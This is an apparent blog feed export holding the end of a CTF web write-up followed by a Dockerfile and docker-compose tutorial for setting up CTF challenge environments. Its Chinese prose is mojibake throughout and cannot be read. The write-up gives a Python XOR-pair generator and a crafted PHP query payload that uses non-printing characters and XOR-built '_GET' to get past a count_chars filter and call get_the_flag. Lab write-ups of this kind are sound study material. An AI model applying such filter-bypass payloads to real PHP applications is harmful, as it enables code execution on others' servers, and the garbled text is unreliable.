class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])) + <span class="hljs-string">&quot;^&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:]))<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(tem) == <span class="hljs-string">&quot;G&quot;</span>):<br>G.append((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])) + <span class="hljs-string">&quot;^&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:]))<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">chr</span>(tem) == <span class="hljs-string">&quot;E&quot;</span>):<br>E.append((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])) + <span class="hljs-string">&quot;^&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:]))<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">chr</span>(tem) == <span class="hljs-string">&quot;T&quot;</span>):<br>T.append((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])) + <span class="hljs-string">&quot;^&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:]))<br><br><span class="hljs-built_in">print</span>(_)<br><span class="hljs-built_in">print</span>(G)<br><span class="hljs-built_in">print</span>(E)<br><span class="hljs-built_in">print</span>(T)<br></code></pre></td></tr></table></figure><p>ç»“æœå¾ˆå¤šï¼Œæˆ‘å°±æŒ‘å–æ¯”è¾ƒå¥½åšçš„ï¼Œå– <code>%85%85%85%85^%da%c2%c0%d1</code> ï¼Œç„¶åè¿˜è¦è€ƒè™‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä¸€æ³¢æ“ä½œä¹‹åæ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">?_=$&#123;%85%85%85%85^%da%c2%c0%d1&#125;&#123;%85&#125;();&amp;%85=get_the_flag<br>?_=$_GET&#123;%85&#125;();&amp;%85=get_the_flag<br>æ„é€ è°ƒç”¨get_the_flag()ï¼Œå…¶ä¸­%85ä¸ºä¸å¯è§å­—ç¬¦ï¼Œä¸ºäº†ç»•è¿‡conut_chars()ã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç»Ÿè®¡ä¸€æ®µå­—ç¬¦ä¸²ä¸­é‡å¤å‡ºç°çš„å­—ç¬¦ä¸²ï¼Œé¢˜ç›®æ¡ä»¶æ˜¯ä¸èƒ½è¶…è¿‡<span class="hljs-number">12</span>ã€‚<br></code></pre></td></tr></table></figure><p>å°è¯•å‘ç°å·²ç»ç»•è¿‡äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¬¬äºŒå±‚ç»•è¿‡äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFä¸­Webçš„dockerç¯å¢ƒä»¥åŠdockerfileç¼–å†™</title>
    <link href="/2019/08/22/web_dockerfile_in_ctf/"/>
    <url>/2019/08/22/web_dockerfile_in_ctf/</url>
    
    <content type="html"><![CDATA[<h1 id="Dockfile"><a href="#Dockfile" class="headerlink" title="Dockfile"></a>Dockfile</h1><blockquote><p>Docker builds images automatically by reading the instructions from a Dockerfile â€“ a text file that contains all commands, in order, needed to build a given image.</p></blockquote><p><code>Dockerfile</code>æ˜¯ä¸€ä¸ªåŒ…å«ç”¨äºç»„åˆæ˜ åƒçš„å‘½ä»¤çš„æ–‡æœ¬æ–‡æ¡£ã€‚å¯ä»¥ä½¿ç”¨åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨ä»»ä½•å‘½ä»¤ã€‚ Dockeré€šè¿‡è¯»å–<code>Dockerfile</code>ä¸­çš„æŒ‡ä»¤è‡ªåŠ¨ç”Ÿæˆæ˜ åƒã€‚</p><p><code>docker build</code>å‘½ä»¤ç”¨äºä»<code>Dockerfile</code>æ„å»ºæ˜ åƒã€‚å¯ä»¥åœ¨<code>docker build</code>å‘½ä»¤ä¸­ä½¿ç”¨<code>-f</code>æ ‡å¿—æŒ‡å‘æ–‡ä»¶ç³»ç»Ÿä¸­ä»»ä½•ä½ç½®çš„<code>Dockerfile</code>ã€‚</p><p><a href="https://docs.docker.com/engine/reference/builder/">Dockerfile reference</a></p><p><a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/">Best practices or writing Dockerfiles</a></p><h2 id="Dockerfileçš„åŸºæœ¬ç»“æ„"><a href="#Dockerfileçš„åŸºæœ¬ç»“æ„" class="headerlink" title="Dockerfileçš„åŸºæœ¬ç»“æ„"></a>Dockerfileçš„åŸºæœ¬ç»“æ„</h2><p><code>Dockerfile</code> ä¸€èˆ¬åˆ†ä¸ºå››éƒ¨åˆ†ï¼šåŸºç¡€é•œåƒä¿¡æ¯ã€ç»´æŠ¤è€…ä¿¡æ¯ã€é•œåƒæ“ä½œæŒ‡ä»¤å’Œå®¹å™¨å¯åŠ¨æ—¶æ‰§è¡ŒæŒ‡ä»¤ï¼Œâ€™#â€™ ä¸º <code>Dockerfile</code> ä¸­çš„æ³¨é‡Šã€‚</p><h2 id="Dockerfileæ–‡ä»¶è¯´æ˜"><a href="#Dockerfileæ–‡ä»¶è¯´æ˜" class="headerlink" title="Dockerfileæ–‡ä»¶è¯´æ˜"></a>Dockerfileæ–‡ä»¶è¯´æ˜</h2><p>Dockerä»¥ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºè¿è¡ŒDockerfileçš„æŒ‡ä»¤ã€‚ä¸ºäº†æŒ‡å®šåŸºæœ¬æ˜ åƒï¼Œç¬¬ä¸€æ¡æŒ‡ä»¤å¿…é¡»æ˜¯<em>FROM</em>ã€‚ä¸€ä¸ªå£°æ˜ä»¥<code>ï¼ƒ</code>å­—ç¬¦å¼€å¤´åˆ™è¢«è§†ä¸ºæ³¨é‡Šã€‚å¯ä»¥åœ¨Dockeræ–‡ä»¶ä¸­ä½¿ç”¨<code>RUN</code>ï¼Œ<code>CMD</code>ï¼Œ<code>FROM</code>ï¼Œ<code>EXPOSE</code>ï¼Œ<code>ENV</code>ç­‰æŒ‡ä»¤ã€‚</p><h2 id="å¸¸ç”¨æŒ‡ä»¤"><a href="#å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤"></a>å¸¸ç”¨æŒ‡ä»¤</h2><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>æŒ‡å®šåŸºç¡€é•œåƒï¼Œå¿…é¡»ä¸ºç¬¬ä¸€ä¸ªå‘½ä»¤</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">æ ¼å¼ï¼š<br>ã€€ã€€FROM <span class="hljs-symbol">&lt;image&gt;</span><br>ã€€ã€€FROM <span class="hljs-symbol">&lt;image&gt;</span>:<span class="hljs-symbol">&lt;tag&gt;</span><br>ã€€ã€€FROM <span class="hljs-symbol">&lt;image&gt;</span>@<span class="hljs-symbol">&lt;digest&gt;</span><br>ç¤ºä¾‹ï¼š<br>ã€€ã€€FROM mysq<span class="hljs-variable">l:5</span>.<span class="hljs-number">6</span><br>æ³¨ï¼š<br>ã€€ã€€<span class="hljs-keyword">tag</span>æˆ–digestæ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸ä½¿ç”¨è¿™ä¸¤ä¸ªå€¼æ—¶ï¼Œä¼šä½¿ç”¨latestç‰ˆæœ¬çš„åŸºç¡€é•œåƒ<br></code></pre></td></tr></table></figure><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><p>ç»´æŠ¤è€…ä¿¡æ¯</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">æ ¼å¼ï¼š<br>    <span class="hljs-keyword">MAINTAINER</span> &lt;name&gt;<br>ç¤ºä¾‹ï¼š<br>    <span class="hljs-keyword">MAINTAINER</span> Iven Huang<br>    <span class="hljs-keyword">MAINTAINER</span> mcwingsgone@gmail.com<br>    <span class="hljs-keyword">MAINTAINER</span> <span class="hljs-number">52</span>HeRtz &lt;mcwingsgone@gmail.com&gt;<br></code></pre></td></tr></table></figure><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>æ„å»ºé•œåƒæ—¶æ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">RUN</span>ç”¨äºåœ¨é•œåƒå®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œå…¶æœ‰ä»¥ä¸‹ä¸¤ç§å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼š<br><span class="hljs-keyword">shell</span>æ‰§è¡Œ<br>æ ¼å¼ï¼š<br>    <span class="hljs-keyword">RUN</span> &lt;command&gt;<br>execæ‰§è¡Œ<br>æ ¼å¼ï¼š<br>    <span class="hljs-keyword">RUN</span> [<span class="hljs-string">&quot;executable&quot;</span>, <span class="hljs-string">&quot;param1&quot;</span>, <span class="hljs-string">&quot;param2&quot;</span>]<br>ç¤ºä¾‹ï¼š<br>    <span class="hljs-keyword">RUN</span> [<span class="hljs-string">&quot;executable&quot;</span>, <span class="hljs-string">&quot;param1&quot;</span>, <span class="hljs-string">&quot;param2&quot;</span>]<br>    <span class="hljs-keyword">RUN</span> apk <span class="hljs-keyword">update</span><br>    <span class="hljs-keyword">RUN</span> [<span class="hljs-string">&quot;/etc/execfile&quot;</span>, <span class="hljs-string">&quot;arg1&quot;</span>, <span class="hljs-string">&quot;arg1&quot;</span>]<br>æ³¨ï¼š<br>ã€€ã€€<span class="hljs-keyword">RUN</span>æŒ‡ä»¤åˆ›å»ºçš„ä¸­é—´é•œåƒä¼šè¢«ç¼“å­˜ï¼Œå¹¶ä¼šåœ¨ä¸‹æ¬¡æ„å»ºä¸­ä½¿ç”¨ã€‚å¦‚æœä¸æƒ³ä½¿ç”¨è¿™äº›ç¼“å­˜é•œåƒï¼Œå¯ä»¥åœ¨æ„å»ºæ—¶æŒ‡å®š--<span class="hljs-keyword">no</span>-cacheå‚æ•°ï¼Œå¦‚ï¼šdocker build --<span class="hljs-keyword">no</span>-cache<br></code></pre></td></tr></table></figure><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>å°†æœ¬åœ°æ–‡ä»¶æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼Œtarç±»å‹æ–‡ä»¶ä¼šè‡ªåŠ¨è§£å‹(ç½‘ç»œå‹ç¼©èµ„æºä¸ä¼šè¢«è§£å‹)ï¼Œå¯ä»¥è®¿é—®ç½‘ç»œèµ„æºï¼Œç±»ä¼¼wget</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ ¼å¼ï¼š<br>    <span class="hljs-built_in">ADD</span> &lt;src&gt;<span class="hljs-built_in">..</span>. &lt;dest&gt;<br>    <span class="hljs-built_in">ADD</span> [<span class="hljs-string">&quot;&lt;src&gt;&quot;</span>,<span class="hljs-built_in">..</span>. <span class="hljs-string">&quot;&lt;dest&gt;&quot;</span>] ç”¨äºæ”¯æŒåŒ…å«ç©ºæ ¼çš„è·¯å¾„<br>ç¤ºä¾‹ï¼š<br>    <span class="hljs-built_in">ADD</span> hom* /mydir/          # æ·»åŠ æ‰€æœ‰ä»¥<span class="hljs-string">&quot;hom&quot;</span>å¼€å¤´çš„æ–‡ä»¶<br>    <span class="hljs-built_in">ADD</span> hom?.txt /mydir/      # ? æ›¿ä»£ä¸€ä¸ªå•å­—ç¬¦,ä¾‹å¦‚ï¼š<span class="hljs-string">&quot;home.txt&quot;</span><br>    <span class="hljs-built_in">ADD</span> test relativeDir/     # æ·»åŠ  <span class="hljs-string">&quot;test&quot;</span> åˆ° `WORKDIR`/relativeDir/<br>    <span class="hljs-built_in">ADD</span> test /absoluteDir/    # æ·»åŠ  <span class="hljs-string">&quot;test&quot;</span> åˆ° /absoluteDir/<br></code></pre></td></tr></table></figure><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>åŠŸèƒ½ç±»ä¼¼ADDï¼Œä½†æ˜¯æ˜¯ä¸ä¼šè‡ªåŠ¨è§£å‹æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½è®¿é—®ç½‘ç»œèµ„æº</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">æ ¼å¼:<br><span class="hljs-keyword">COPY</span> èµ„æºæ–‡ä»¶ä½ç½® ç›®æ ‡æ–‡ä»¶ä½ç½®<br>ç¤ºä¾‹:<br><span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/index.php /</span>var<span class="hljs-regexp">/www/</span>html/<br></code></pre></td></tr></table></figure><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p>æ„å»ºå®¹å™¨åè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯åœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰è¿›è¡Œè°ƒç”¨</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">æ ¼å¼ï¼š<br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;executable&quot;</span>,<span class="hljs-string">&quot;param1&quot;</span>,<span class="hljs-string">&quot;param2&quot;</span>] (æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¼˜å…ˆ)</span><br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;param1&quot;</span>,<span class="hljs-string">&quot;param2&quot;</span>] (è®¾ç½®äº†ENTRYPOINTï¼Œåˆ™ç›´æ¥è°ƒç”¨ENTRYPOINTæ·»åŠ å‚æ•°)</span><br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">command</span> param1 param2 (æ‰§è¡Œshellå†…éƒ¨å‘½ä»¤)</span><br>ç¤ºä¾‹ï¼š<br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is a test.&quot;</span> | <span class="hljs-built_in">wc</span> -</span><br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/usr/bin/wc&quot;</span>,<span class="hljs-string">&quot;--help&quot;</span>]</span><br>æ³¨ï¼š<br> ã€€ã€€<span class="hljs-keyword">CMD</span><span class="language-bash">ä¸åŒäºRUNï¼ŒCMDç”¨äºæŒ‡å®šåœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€ŒRUNç”¨äºæŒ‡å®šé•œåƒæ„å»ºæ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</span><br></code></pre></td></tr></table></figure><h3 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h3><p>ç”¨äºæŒ‡å®šæŒä¹…åŒ–ç›®å½•</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">æ ¼å¼ï¼š<br>    <span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;/path/to/dir&quot;</span>]</span><br>ç¤ºä¾‹ï¼š<br>    <span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;/data&quot;</span>]</span><br>    <span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;/var/www&quot;</span>, <span class="hljs-string">&quot;/var/log/apache2&quot;</span>, <span class="hljs-string">&quot;/etc/apache2&quot;</span>æ³¨ï¼šã€€ã€€ä¸€ä¸ªå·å¯ä»¥å­˜åœ¨äºä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨çš„æŒ‡å®šç›®å½•ï¼Œè¯¥ç›®å½•å¯ä»¥ç»•è¿‡è”åˆæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶å…·æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š</span><br><span class="hljs-number">1</span> å·å¯ä»¥å®¹å™¨é—´å…±äº«å’Œé‡ç”¨<br><span class="hljs-number">2</span> å®¹å™¨å¹¶ä¸ä¸€å®šè¦å’Œå…¶å®ƒå®¹å™¨å…±äº«å·<br><span class="hljs-number">3</span> ä¿®æ”¹å·åä¼šç«‹å³ç”Ÿæ•ˆ<br><span class="hljs-number">4</span> å¯¹å·çš„ä¿®æ”¹ä¸ä¼šå¯¹é•œåƒäº§ç”Ÿå½±å“<br><span class="hljs-number">5</span> å·ä¼šä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ°æ²¡æœ‰ä»»ä½•å®¹å™¨åœ¨ä½¿ç”¨å®ƒ<br></code></pre></td></tr></table></figure><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>æŒ‡å®šäºå¤–ç•Œäº¤äº’çš„ç«¯å£</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">æ ¼å¼ï¼š<br>    <span class="hljs-keyword">EXPOSE</span> &lt;port&gt; [&lt;port&gt;...]<br>ç¤ºä¾‹ï¼š<br>    <span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span> <span class="hljs-number">443</span><br>    <span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br>    <span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">11211</span>/tcp <span class="hljs-number">11211</span>/udp<br>æ³¨ï¼š<br>ã€€ã€€<span class="hljs-keyword">EXPOSE</span>å¹¶ä¸ä¼šè®©å®¹å™¨çš„ç«¯å£è®¿é—®åˆ°ä¸»æœºã€‚è¦ä½¿å…¶å¯è®¿é—®ï¼Œéœ€è¦åœ¨docker <span class="hljs-keyword">run</span><span class="language-bash">è¿è¡Œå®¹å™¨æ—¶é€šè¿‡-pæ¥å‘å¸ƒè¿™äº›ç«¯å£ï¼Œæˆ–é€šè¿‡-På‚æ•°æ¥å‘å¸ƒEXPOSEå¯¼å‡ºçš„æ‰€æœ‰ç«¯å£</span><br></code></pre></td></tr></table></figure><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>å·¥ä½œç›®å½•ï¼Œç±»ä¼¼äºcdå‘½ä»¤</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">æ ¼å¼ï¼š<br>    <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /path/to/workdir</span><br>ç¤ºä¾‹ï¼š<br>    <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /a  (è¿™æ—¶å·¥ä½œç›®å½•ä¸º/a)</span><br>    <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> b  (è¿™æ—¶å·¥ä½œç›®å½•ä¸º/a/b)</span><br>    <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> c  (è¿™æ—¶å·¥ä½œç›®å½•ä¸º/a/b/c)</span><br>æ³¨ï¼š<br>ã€€ã€€é€šè¿‡<span class="hljs-keyword">WORKDIR</span><span class="language-bash">è®¾ç½®å·¥ä½œç›®å½•åï¼ŒDockerfileä¸­å…¶åçš„å‘½ä»¤RUNã€CMDã€ENTRYPOINTã€ADDã€COPYç­‰å‘½ä»¤éƒ½ä¼šåœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œã€‚åœ¨ä½¿ç”¨docker runè¿è¡Œå®¹å™¨æ—¶ï¼Œå¯ä»¥é€šè¿‡-wå‚æ•°è¦†ç›–æ„å»ºæ—¶æ‰€è®¾ç½®çš„å·¥ä½œç›®å½•ã€‚</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„å›¾ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/19/3AtDRe.png" alt="3AtDRe.png"></p><p>æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåä¸ºDockerfileï¼Œç¼–å†™å®Œå†…å®¹åï¼Œåœ¨å½“å‰ç›®å½•æ‰§è¡Œï¼š</p><p><code>$ docker build .</code></p><p>å³å¯è·å¾—dockerfileæ‰€å¯¹åº”çš„é•œåƒï¼Œè¿™é‡Œå¯ä»¥ç”¨-tå‚æ•°ç»™é•œåƒæ‰“ä¸Šæ ‡ç­¾</p><p><code>$ docker build â€“t newimage:1.0 .</code></p><p>è¿è¡Œé•œåƒï¼š</p><p><code>$docker run â€“it â€“p 8080:80 newimage:1.0 </code></p><p><code>-i</code>ï¼šæ˜¯å¼€å¯æ ‡å‡†è¾“å…¥ï¼Œ<code>-t</code> : æ˜¯åˆ†é…ttyï¼Œ<code>-p</code>æ˜¯è½¬å‘ç«¯å£ï¼Œæœ¬æœºç«¯å£:å®¹å™¨ç«¯å£</p><p>å¦‚æœè¦åå°è¿è¡Œï¼Œå¯ä»¥ç›´æ¥è¾“å…¥ <code>-d</code>:</p><p><code>$docker run â€“d â€“p 8080:80 newimage:1.0 </code></p><h1 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h1><p>æœ‰äº†imageï¼Œä½†æ˜¯å¯åŠ¨å‚æ•°å•¥çš„ä¹Ÿæ²¡æ³•æ–¹ä¾¿çš„å‘Šè¯‰åˆ«äººï¼Œé‚£å°±æŠŠè¿™äº›ä¹Ÿå†™åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œã€‚<br><a href="https://docs.docker.com/compose/">Overview of Docker Compose</a></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-symbol">services:</span><br><span class="hljs-symbol">  web:</span><br><span class="hljs-symbol">    build:</span> .<br><span class="hljs-symbol">    image:</span> newimage:<span class="hljs-number">1.0</span><br><span class="hljs-symbol">    ports:</span><br>    - <span class="hljs-string">&quot;8080:80&quot;</span><br><span class="hljs-symbol">    stdin_open:</span> true<br><span class="hljs-symbol">    tty:</span> true<br></code></pre></td></tr></table></figure><h2 id="yml"><a href="#yml" class="headerlink" title="yml"></a>yml</h2><ul><li>å¤§å°å†™æ•æ„Ÿ</li><li>ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»</li><li>ç¦æ­¢ä½¿ç”¨tabç¼©è¿›ï¼Œåªèƒ½ä½¿ç”¨ç©ºæ ¼é”®</li><li>ç¼©è¿›é•¿åº¦æ²¡æœ‰é™åˆ¶ï¼Œåªè¦å…ƒç´ å¯¹é½å°±è¡¨ç¤ºè¿™äº›å…ƒç´ å±äºä¸€ä¸ªå±‚çº§</li><li>ä½¿ç”¨#è¡¨ç¤ºæ³¨é‡Š</li><li>å­—ç¬¦ä¸²å¯ä»¥ä¸ç”¨å¼•å·æ ‡æ³¨</li></ul><p>ç¼–å†™å®Œä¹‹ååœ¨å½“å‰ç›®å½•è¿è¡Œï¼š</p><p><code>docker-compose up -d</code></p><h2 id="æ›´å¤æ‚çš„docker-compose"><a href="#æ›´å¤æ‚çš„docker-compose" class="headerlink" title="æ›´å¤æ‚çš„docker-compose"></a>æ›´å¤æ‚çš„docker-compose</h2><p><img src="https://s2.ax1x.com/2020/02/19/3AU0jH.png" alt="3AU0jH.png"></p><p><a href="https://github.com/wonderkun/CTF_web/blob/master/web400-13/docker-compose.yml">https://github.com/wonderkun/CTF_web/blob/master/web400-13/docker-compose.yml</a></p><p>æ›´å®Œæ•´çš„CTF Dockerå¯ä»¥å‚è€ƒå›½èµ›çš„demo</p><h1 id="PHPä»£ç å®¡è®¡æˆ–SQLæ³¨å…¥ç±»-LAMP"><a href="#PHPä»£ç å®¡è®¡æˆ–SQLæ³¨å…¥ç±»-LAMP" class="headerlink" title="PHPä»£ç å®¡è®¡æˆ–SQLæ³¨å…¥ç±»(LAMP)"></a>PHPä»£ç å®¡è®¡æˆ–SQLæ³¨å…¥ç±»(LAMP)</h1><p>è¿™ä¸ªåªè¦æœ‰lampç¯å¢ƒå°±å¯ä»¥äº†ï¼Œè¿™é‡Œä»¥ä»£ç å®¡è®¡ä¸ºä¸»ï¼Œä½¿ç”¨çš„æ˜¯ <code>tutum/lamp</code>ã€‚</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> tutum/lamp <span class="hljs-comment"># pullä¸‹tutum/lamp é•œåƒ</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g&quot;</span> /etc/apt/sources.list <span class="hljs-comment"># æ¢æº</span></span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> /var/www/html/phpinfo.php /var/www/html/LICENSE  /var/www/html/README.md /var/www/html/logo.png</span><br><span class="hljs-comment"># åˆ é™¤ç¯å¢ƒåŸæœ¬çš„ä¸€å †ä¸œè¥¿</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./index.php /var/www/html/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> css /var/www/html/css/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> img /var/www/html/img/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> js /var/www/html/js/</span><br><span class="hljs-comment"># æºç copyè¿›å»ç›®å½•ï¼Œå¯è‡ªè¡Œä¿®æ”¹</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /var/www/html/</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> www-data:www-data /var/www/html/* -R</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> -R 755 /var/www/html/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> service apache2 restart</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span 